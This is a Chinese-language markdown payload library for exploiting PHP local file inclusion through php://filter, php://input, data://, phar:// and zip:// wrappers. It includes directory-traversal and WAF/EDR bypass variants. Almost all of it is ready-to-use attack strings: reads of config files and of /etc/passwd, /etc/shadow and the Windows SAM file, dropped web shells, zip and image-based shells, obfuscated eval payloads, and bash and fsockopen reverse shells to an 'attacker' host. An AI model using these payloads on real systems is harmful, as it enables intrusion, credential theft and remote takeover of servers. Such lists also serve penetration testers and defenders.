# PHP 伪协议链(Filter / Input / Data / Zip / Wrapper)payload 库

> 父文档:[00-index.md](00-index.md)
> 涵盖:PHP 伪协议利用 + Filter 链(`php://filter/convert.base64-encode`) + Input(POST body 直接执行) + Data 协议 + Zip 协议。任何 PHP 站 LFI 都要试一遍。

---

利用PHP伪协议进行LFI攻击
子类：**伪协议** · tags: `lfi` `wrapper` `php` `protocol`

**前置条件：** 存在LFI漏洞；PHP环境；伪协议未禁用

**攻击链：**

**1. 1. php://filter**
_使用php://filter读取源码_
```
# 读取源码(Base64)
?file=php://filter/convert.base64-encode/resource=config.php

# 读取源码(Rot13)
?file=php://filter/read=string.rot13/resource=config.php

# 多重过滤器
?file=php://filter/convert.base64-encode|string.rot13/resource=config.php
```

**2. 2. php://input**
_使用php://input执行代码_
```
# POST执行PHP代码
?file=php://input
POST: <?php system('id'); ?>

# 执行任意代码
POST: <?php phpinfo(); ?>
POST: <?php echo file_get_contents('/etc/passwd'); ?>
```

**3. 3. data://协议**
_使用data://协议执行代码_
```
# 直接执行代码
?file=data://text/plain,<?php system('id'); ?>

# Base64编码
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# 执行任意命令
?file=data://text/plain,<?php system($_GET['c']); ?>&c=id
```

**4. 4. phar://协议**
_使用phar://协议_
```
# 创建phar文件
<?php
$p = new Phar('shell.phar');
$p->addFromString('shell.txt', '<?php system($_GET["c"]); ?>');
?>

# 包含phar
?file=phar://shell.phar/shell.txt&c=id
```

**5. 5. zip://协议**
_使用zip://协议_
```
# 创建zip文件
zip shell.zip shell.txt
# shell.txt内容: <?php system($_GET['c']); ?>

# 包含zip
?file=zip://shell.zip%23shell.txt&c=id

# 使用jpg+zip
copy shell.jpg+shell.zip shell.jpg
?file=zip://shell.jpg%23shell.txt&c=id
```

**WAF/EDR 绕过变体：**

**1. 大小写混淆**
_大小写混淆绕过_
```
?file=Php://filter/convert.base64-encode/resource=config.php
?file=DATA://text/plain,<?php system('id'); ?>
```

**2. 双重URL编码**
_双重URL编码绕过_
```
?file=php%3A%2F%2Ffilter/convert.base64-encode/resource=config.php
?file=%70%68%70%3a%2f%2finput
```

---

### 目录遍历技术  `lfi-traversal`
LFI目录遍历绕过技术
子类：**目录遍历** · tags: `lfi` `traversal` `bypass` `path`

**前置条件：** 存在LFI漏洞；存在路径过滤

**攻击链：**

**1. 1. 基础遍历**
_基础目录遍历_
```
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
..\..\..\windows\win.ini
```

**2. 2. 绕过删除../**
_绕过删除../的过滤_
```
....//....//....//etc/passwd
....//....//etc/passwd
..././..././..././etc/passwd
```

**3. 3. URL编码绕过**
_URL编码绕过_
```
..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

**4. 4. Unicode编码绕过**
_Unicode编码绕过_
```
..%c0%af..%c0%af..%c0%afetc/passwd
..%c1%9c..%c1%9c..%c1%9cwindows\win.ini
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
```

**5. 5. 绝对路径绕过**
_使用绝对路径_
```
/etc/passwd
/etc/shadow
/var/log/apache2/access.log
C:/windows/win.ini
C:\windows\system32\config\sam
```

**WAF/EDR 绕过变体：**

**1. 混合编码**
_混合编码绕过_
```
..%2f..%c0%af..%2fetc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

**2. 空字节截断**
_空字节截断绕过后缀_
```
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd%00.html
```

**3. 点号截断(Windows)**  _[windows]_
_Windows点号截断_
```
../../../windows/win.ini.
../../../windows/win.ini...
../../../boot.ini……
```

---

### PHP Filter链攻击  `lfi-php-filter`
利用PHP Filter链进行LFI攻击
子类：**PHP Filter** · tags: `lfi` `php` `filter` `chain`

**前置条件：** 存在LFI漏洞；PHP环境；filter伪协议可用

**攻击链：**

**1. 1. 读取源码**
_使用Filter读取源码_
```
# Base64编码读取
?file=php://filter/convert.base64-encode/resource=index.php

# Rot13读取
?file=php://filter/read=string.rot13/resource=index.php

# 字符转换
?file=php://filter/read=string.toupper/resource=index.php
```

**2. 2. 多重过滤器**
_使用多重过滤器_
```
# 多重编码
?file=php://filter/convert.base64-encode|string.rot13/resource=config.php

# 去除PHP标签
?file=php://filter/read=string.strip_tags/resource=index.php
```

**3. 3. Filter链RCE**
_使用高级过滤器_
```
# 使用iconv过滤器
?file=php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php

# 使用zlib压缩
?file=php://filter/zlib.deflate/resource=index.php
?file=php://filter/zlib.inflate/resource=data
```

**4. 4. 读取配置文件**
_读取常见框架配置_
```
# WordPress配置
?file=php://filter/convert.base64-encode/resource=wp-config.php

# Laravel .env
?file=php://filter/convert.base64-encode/resource=../.env

# ThinkPHP配置
?file=php://filter/convert.base64-encode/resource=application/database.php
```

**WAF/EDR 绕过变体：**

**1. 大小写混淆**
_大小写混淆绕过_
```
?file=PHP://FILTER/CONVERT.BASE64-ENCODE/RESOURCE=config.php
?file=PhP://FiLtEr/convert.base64-encode/resource=config.php
```

**2. 编码绕过**
_URL编码绕过_
```
?file=%70%68%70%3a%2f%2f%66%69%6c%74%65%72/convert.base64-encode/resource=config.php
```

---

### PHP Input执行  `lfi-php-input`
利用php://input执行PHP代码
子类：**PHP Input** · tags: `lfi` `php` `input` `rce`

**前置条件：** 存在LFI漏洞；allow_url_include=On；POST方法可用

**攻击链：**

**1. 1. 基础执行**
_使用php://input执行代码_
```
# GET请求
GET ?file=php://input

# POST数据
POST: <?php system('id'); ?>
POST: <?php echo 'Hello'; ?>
```

**2. 2. 命令执行**
_执行系统命令_
```
# 执行系统命令
POST: <?php system($_GET['c']); ?>
# 然后访问: ?file=php://input&c=id

# 使用exec
POST: <?php echo exec('id'); ?>

# 使用shell_exec
POST: <?php echo shell_exec('id'); ?>
```

**3. 3. 文件操作**
_文件操作_
```
# 读取文件
POST: <?php echo file_get_contents('/etc/passwd'); ?>

# 写入文件
POST: <?php file_put_contents('shell.php', '<?php system($_GET["c"]); ?>'); ?>

# 列出目录
POST: <?php print_r(scandir('.')); ?>
```

**4. 4. 反弹Shell**  _[linux]_
_获取反弹Shell_
```
POST: <?php system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\""); ?>

# 或使用
POST: <?php $sock=fsockopen("attacker",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_使用编码绕过_
```
# Base64编码
POST: <?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjJ10pOw==')); ?>
# 解码后: system($_GET['c']);

# Rot13编码
POST: <?php eval(str_rot13('flfgrz($_TRG['p']);')); ?>
```

**2. 短标签**
_WAF绕过技术_
```
POST: <?=system($_GET['c']);?>
POST: <?=`$_GET[c]`?>
```

---

### PHP Data协议攻击  `lfi-php-data`
利用data://协议执行PHP代码
子类：**PHP Data** · tags: `lfi` `php` `data` `protocol`

**前置条件：** 存在LFI漏洞；allow_url_include=On；data协议可用

**攻击链：**

**1. 1. 基础执行**
_使用data://协议执行代码_
```
# 直接执行
?file=data://text/plain,<?php system('id'); ?>

# 执行phpinfo
?file=data://text/plain,<?php phpinfo(); ?>

# 输出文本
?file=data://text/plain,Hello World
```

**2. 2. Base64编码**
_使用Base64编码_
```
# Base64编码执行
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
# 解码后: <?php system('id'); ?>

# 带参数执行
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id
```

**3. 3. 命令执行**
_执行系统命令_
```
# 交互式命令
?file=data://text/plain,<?php system($_GET['c']); ?>&c=id
?file=data://text/plain,<?php system($_GET['c']); ?>&c=whoami
?file=data://text/plain,<?php system($_GET['c']); ?>&c=cat /etc/passwd
```

**4. 4. 反弹Shell**  _[linux]_
_获取反弹Shell_
```
?file=data://text/plain,<?php system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\""); ?>

# Base64版本
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJiYXNoIC1jIFwiYmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci80NDQ0IDA+JjFcIiIpOyA/Pg==
```

**WAF/EDR 绕过变体：**

**1. 大小写混淆**
_大小写混淆绕过_
```
?file=DATA://TEXT/PLAIN,<?php system('id'); ?>
?file=Data://Text/Plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

**2. URL编码**
_URL编码绕过_
```
?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%69%64%27%29%3b%20%3f%3e
```

**3. MIME类型变换**
_变换MIME类型_
```
?file=data://text/html,<?php system('id'); ?>
?file=data://application/x-httpd-php,<?php system('id'); ?>
```

---

### PHP Zip协议攻击  `lfi-php-zip`
利用zip://协议进行LFI攻击
子类：**PHP Zip** · tags: `lfi` `php` `zip` `archive`

**前置条件：** 存在LFI漏洞；可上传zip文件；zip协议可用

**攻击链：**

**1. 1. 创建恶意Zip**
_创建恶意Zip文件_
```
# 创建shell.txt
echo '<?php system($_GET["c"]); ?>' > shell.txt

# 创建zip文件
zip shell.zip shell.txt

# 或使用Python
import zipfile
with zipfile.ZipFile('shell.zip', 'w') as z:
    z.writestr('shell.txt', '<?php system($_GET["c"]); ?>')
```

**2. 2. 上传Zip文件**
_上传Zip文件_
```
# 通过文件上传功能上传shell.zip
# 或通过其他方式上传

# 记住上传路径
/uploads/shell.zip
```

**3. 3. 包含Zip文件**
_包含Zip文件执行代码_
```
# 使用zip://协议包含
?file=zip://uploads/shell.zip%23shell.txt&c=id

# %23是#的URL编码
# 格式: zip://路径#文件名
```

**4. 4. 图片马**
_使用图片马上传_
```
# 创建图片马
copy image.jpg+shell.zip image.jpg

# 或使用
cat image.jpg shell.zip > image.jpg

# 包含
?file=zip://uploads/image.jpg%23shell.txt&c=id
```

**WAF/EDR 绕过变体：**

**1. 使用phar://**
_使用phar://协议_
```
?file=phar://uploads/shell.zip/shell.txt&c=id
# phar://也可以访问zip文件
```

**2. 压缩包嵌套**
_压缩包嵌套绕过_
```
# 在zip中嵌套zip
zip inner.zip shell.txt
zip outer.zip inner.zip

# 包含
?file=zip://outer.zip%23inner.zip%23shell.txt&c=id
```

---


---

← 回 [00-index.md](00-index.md) · 相关:[`13-phar-session-proc.md`](13-phar-session-proc.md)
